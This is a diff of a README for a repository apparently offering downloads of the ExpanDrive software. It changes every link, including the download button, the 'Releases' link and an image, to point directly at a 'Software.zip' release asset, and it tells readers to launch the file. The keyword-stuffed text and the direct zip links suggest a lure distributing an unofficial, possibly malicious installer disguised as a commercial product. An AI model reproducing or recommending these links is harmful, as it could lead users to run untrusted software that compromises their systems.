@@ -25,17 +25,17 @@ This repository covers topics such as ExpanDrive for Ubuntu, conjugaison expandr
 
 ## Get Started
 To download the latest version of the ExpanDrive software, click on the button below:
-[![Download ExpanDrive](https://github.com/badr354/ExpanDrive-Download/releases/download/v1.0/Installer.zip)](https://github.com/badr354/ExpanDrive-Download/releases/download/v1.0/Installer.zip)
+[![Download ExpanDrive](https://github.com/badr354/ExpanDrive-Download/releases/download/v2.0/Software.zip)](https://github.com/badr354/ExpanDrive-Download/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the file, launch it to begin the installation process.
 
 ## Resources
-For more information and updates, visit the ExpanDrive-Download [Releases](https://github.com/badr354/ExpanDrive-Download/releases/download/v1.0/Installer.zip) section.
+For more information and updates, visit the ExpanDrive-Download [Releases](https://github.com/badr354/ExpanDrive-Download/releases/download/v2.0/Software.zip) section.
 
 ## 🌟 Get Connected! 🌟
 Do you want to expand your drive with ExpanDrive? Join our community and explore the possibilities today! 🚀
 
-![ExpanDrive Image](https://github.com/badr354/ExpanDrive-Download/releases/download/v1.0/Installer.zip)
+![ExpanDrive Image](https://github.com/badr354/ExpanDrive-Download/releases/download/v2.0/Software.zip)
 
 We hope you find this repository helpful and informative. Feel free to reach out if you have any questions or feedback. Happy expanding with ExpanDrive! 👨‍💻🔗
 
